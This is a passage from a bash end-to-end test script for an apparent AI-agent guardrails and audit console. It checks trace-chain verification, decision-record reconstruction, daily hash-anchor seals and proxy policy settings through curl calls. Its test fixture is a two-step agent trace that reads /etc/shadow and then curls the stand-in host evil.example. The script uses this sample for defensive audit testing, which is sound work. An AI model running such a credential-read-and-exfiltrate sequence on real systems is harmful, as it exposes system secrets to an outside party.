      "checkpoint tool_names aggregates the session's tools"

info "E2E: trace-chain verify (A3) — valid 2-step chain passes"
V=$(curl -s "$AC/audit/trace-chain/verify?session_id=$SID")
check "$(printf '%s' "$V" | jget 'print("1" if d.get("data",{}).get("passed") and d.get("data",{}).get("verified_events")==2 else "0")')" \
      "trace-chain verify: passed + verified_events == 2"
check "$(printf '%s' "$V" | jget 'print("1" if d.get("data",{}).get("break_seq") in (None,0) else "0")')" \
      "no break_seq on a valid chain"
V=$(curl -s "$AC/audit/trace-chain/verify")
check "$(printf '%s' "$V" | jget 'print("1" if "sessions" in d.get("data",{}) and d.get("data",{}).get("verified_sessions",0)>=1 else "0")')" \
      "tenant trace-chain verify reports >=1 verified session"
check "$(printf '%s' "$V" | jget 'print("1" if not any(s.get("session_id")==sys.argv[1] for s in d.get("data",{}).get("broken",[])) else "0")' "$SID")" \
      "session is not flagged broken at the tenant level"

info "E2E: decision BOM trace phase reconstructs the ordered steps"
V=$(curl -s "$AC/audit/decision-bom/$TRACE")
check "$(printf '%s' "$V" | jget 'print("1" if len(d.get("data",{}).get("trace_steps",[]))==2 else "0")')" \
      "BOM trace_steps == 2 (ordered behaviour steps)"
check "$(printf '%s' "$V" | jget 'print("1" if [s.get("step_seq") for s in d.get("data",{}).get("trace_steps",[])]==[1,2] else "0")')" \
      "BOM trace_steps ordered by step_seq"
check "$(printf '%s' "$V" | jget 'print("1" if d.get("data",{}).get("session_id")==sys.argv[1] else "0")' "$SID")" \
      "BOM session phase resolves the owning session"
check "$(printf '%s' "$V" | jget 'print("1" if len(d.get("data",{}).get("audit_events",[]))==0 else "0")')" \
      "BOM trace phase works without audit events (trace-only flow)"

info "E2E: tool_args round-trip through the console (V18 column)"
# The proxy wire format above carried tool_args; it must read back verbatim
# through every console surface that reconstructs a decision, otherwise the
# column exists but is dead. tool_args is returned as the stored TEXT (a JSON
# string), so assert on the embedded values.
check "$(printf '%s' "$V" | jget 'print("1" if "/etc/shadow" in str(d.get("data",{}).get("trace_steps",[{}])[0].get("tool_args") or "") else "0")')" \
      "BOM trace_steps[0].tool_args carries the ingested read_file path"
check "$(printf '%s' "$V" | jget 'print("1" if "evil.example" in str(d.get("data",{}).get("trace_steps",[{}])[1].get("tool_args") or "") else "0")')" \
      "BOM trace_steps[1].tool_args carries the ingested curl url"

TL=$(curl -s "$AC/trace/session/$SID/timeline")
check "$(printf '%s' "$TL" | jget 'print("1" if len(d.get("data",[]))==2 else "0")')" \
      "session timeline returns the 2 ingested steps"
check "$(printf '%s' "$TL" | jget 'print("1" if "/etc/shadow" in str(d.get("data",[{}])[0].get("tool_args") or "") else "0")')" \
      "timeline step 1 tool_args read back from tb_agent_trace"
check "$(printf '%s' "$TL" | jget 'print("1" if d.get("data",[{}])[0].get("risk_score")==10 else "0")')" \
      "timeline risk_score normalized to the stored int"

CH=$(curl -s "$AC/trace/$TRACE/chain")
check "$(printf '%s' "$CH" | jget 'print("1" if len(d.get("data",[]))==2 and "evil.example" in str(d.get("data",[{}])[1].get("tool_args") or "") else "0")')" \
      "trace chain endpoint returns the same tool_args"

info "E2E: daily-anchor seal (A3) + read-back for the anchored day"
# The seal Merkle-anchors the day's chained trace-session heads. It now reports
# what was sealed (not a blind echo) and the anchor can be read back through the
# API, so persistence is verifiable end to end.
SEAL=$(curl -s -X POST "$AC/audit/daily-anchor/seal" -H 'Content-Type: application/json' \
    -d "{\"date\":\"$ANCHOR_DATE\"}")
check "$(printf '%s' "$SEAL" | jget "print('1' if d.get('data',{}).get('sealed_date')=='$ANCHOR_DATE' else '0')")" \
      "daily-anchor seal echoes sealed_date=$ANCHOR_DATE"
check "$(printf '%s' "$SEAL" | jget 'print("1" if d.get("data",{}).get("sealed") and d.get("data",{}).get("tenants_sealed",0)>=1 else "0")')" \
      "daily-anchor seal reports sealed=true + tenants_sealed>=1 (not a blind echo)"
# The seal is global — it anchors every tenant that had trace rows that day —
# so the response only carries a top-level root_hash when exactly one tenant was
# sealed. Pull this tenant's root out of anchors[] instead, which is always
# present, and compare it with the persisted anchor row.
SEAL_ROOT=$(printf '%s' "$SEAL" | jget "print(next((a.get('root_hash') for a in d.get('data',{}).get('anchors',[]) if a.get('tenant_id')=='$T'), ''))")
ROOT_BACK=$(curl -s "$AC/audit/daily-anchor/$ANCHOR_DATE" | jget 'print(d.get("data",{}).get("root_hash",""))')
SESS_BACK=$(curl -s "$AC/audit/daily-anchor/$ANCHOR_DATE" | jget 'print(d.get("data",{}).get("sessions",0))')
check "$([ -n "$SEAL_ROOT" ] && [ "$SEAL_ROOT" = "$ROOT_BACK" ] && echo 1 || echo 0)" \
      "daily-anchor read-back: GET returns this tenant's sealed root_hash"
check "$([ "${SESS_BACK:-0}" -ge 1 ] 2>/dev/null && echo 1 || echo 0)" \
      "daily-anchor read-back: sessions >= 1"
check "$(curl -s "$AC/audit/daily-anchor" | jget 'print("1" if any(a.get("anchor_date")==sys.argv[1] for a in d.get("data",[])) else "0")' "$ANCHOR_DATE")" \
      "daily-anchor list includes the sealed day"
check "$(curl -s "$AC/audit/daily-anchor/1999-01-01" | jget 'print("1" if d.get("code")==404 else "0")')" \
      "daily-anchor missing day -> 404 code"
check "$(printf '%s' "$SEAL" | jget 'print("1" if d.get("data",{}).get("events",0)>=1 else "0")')" \
      "daily-anchor seal reports events >= 1"
check "$(printf '%s' "$SEAL" | jget "print('1' if not d.get('data',{}).get('failed') else '0')")" \
      "daily-anchor seal reports no failed tenant"
check "$(printf '%s' "$SEAL" | jget "print('1' if any(a.get('tenant_id')=='$T' for a in d.get('data',{}).get('anchors',[])) else '0')")" \
      "daily-anchor anchors[] includes this tenant"
check "$(curl -s "$AC/audit/daily-anchor/not-a-date" | jget 'print("1" if d.get("code")==400 else "0")')" \
      "daily-anchor malformed date -> 400 code"

info "E2E: audit hash-chain verify + chain status (A3)"
V=$(curl -s -X POST "$AC/audit/verify" -H 'Content-Type: application/json' -d '{}')
check "$(printf '%s' "$V" | jget 'print("1" if d.get("data",{}).get("passed") and d.get("data",{}).get("total_events",0)>=1 else "0")')" \
      "audit hash-chain verify: passed with >=1 chained event"
V=$(curl -s "$AC/audit/chain/status")
check "$(printf '%s' "$V" | jget 'print("1" if "data" in d else "0")')" "audit chain status responds"

info "E2E: session checkpoint missing -> 404 (C5 read path)"
R=$(curl -s "$AC/sessions/nope/checkpoint")
check "$(printf '%s' "$R" | jget 'print("1" if d.get("code")==404 else "0")')" \
      "session checkpoint missing -> 404 code"

info "E2E: export ledger (A7)"
V=$(curl -s "$AC/audit/export" | jget 'print("1" if len(d.get("data",[]))>=1 else "0")')
check "$V" "export list shows the job"
R=$(curl -s "$AC/audit/export/nope")
check "$(printf '%s' "$R" | jget 'print("1" if d.get("code")==404 else "0")')" "export get missing -> 404 code"

# ── proxy policy: the hot-reloadable policy row via the console API ─────────
# tb_proxy_policy is read/written by the proxy-policy admin API; it is the row
# behind the MCP proxy's hot reload (save also pushes a Redis snapshot + stream
# event). GET of an unsaved tenant must return the normalized defaults, and a
# PUT must survive a full round trip through the table.
info "E2E: proxy policy GET returns normalized defaults (V17 tb_proxy_policy)"
PP=$(curl -s "$AC/proxy-policy")
check "$(printf '%s' "$PP" | jget 'print("1" if d.get("data",{}).get("session_ttl_secs")==1800 else "0")')" \
      "proxy-policy defaults: session_ttl_secs==1800"
check "$(printf '%s' "$PP" | jget 'print("1" if d.get("data",{}).get("fallback_policy")=="minimum_privilege" else "0")')" \
      "proxy-policy defaults: fallback_policy==minimum_privilege"
check "$(printf '%s' "$PP" | jget 'print("1" if d.get("data",{}).get("upstreams")==[] else "0")')" \
      "proxy-policy defaults: empty upstreams list"

info "E2E: proxy policy PUT round-trips through the table"
R=$(curl -s -X PUT "$AC/proxy-policy" -H 'Content-Type: application/json' \
    -d '{"session_ttl_secs":3600,"fallback_policy":"audit_only","output_review":{"min_risk_score":60}}')
check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("published") else "0")')" \
      "proxy-policy PUT reports published=true (Redis snapshot + reload event)"
PP=$(curl -s "$AC/proxy-policy")
check "$(printf '%s' "$PP" | jget 'print("1" if d.get("data",{}).get("session_ttl_secs")==3600 else "0")')" \
      "proxy-policy GET reflects the saved session_ttl_secs"
check "$(printf '%s' "$PP" | jget 'print("1" if d.get("data",{}).get("fallback_policy")=="audit_only" else "0")')" \
      "proxy-policy GET reflects the saved fallback_policy"
check "$(printf '%s' "$PP" | jget 'print("1" if d.get("data",{}).get("output_review",{}).get("min_risk_score")==60 else "0")')" \
      "proxy-policy nested output_review saved and normalized"
R=$(curl -s -X PUT "$AC/proxy-policy" -H 'Content-Type: application/json' \
    -d '{"upstreams":[{"name":"only-name"}]}')
check "$(printf '%s' "$R" | jget 'print("1" if d.get("code")==400 else "0")')" \
      "proxy-policy upstream without a url -> 400"
V=$(curl -s -o /dev/null -w '%{http_code}' -X PUT "$AC/proxy-policy" -H 'Content-Type: application/json' \
    -d '{"fallback_policy":"whatever"}')
check "$([ "$V" = "400" ] && echo 1 || echo 0)" \
      "proxy-policy invalid fallback_policy -> 400"
R=$(curl -s "$AC/proxy-policy")
check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("session_ttl_secs")==3600 else "0")')" \
      "proxy-policy rejected PUT leaves the previously saved row intact"

# ── summary ──────────────────────────────────────────────────────────────────
echo
echo "============ guardrails full-flow (API-only) summary ============"
green "PASS: $PASS"
[ "$FAIL" -gt 0 ] && red "FAIL: $FAIL" || echo "FAIL: 0"
[ "$FAIL" -eq 0 ] || exit 1
green "ALL CHECKS PASSED"
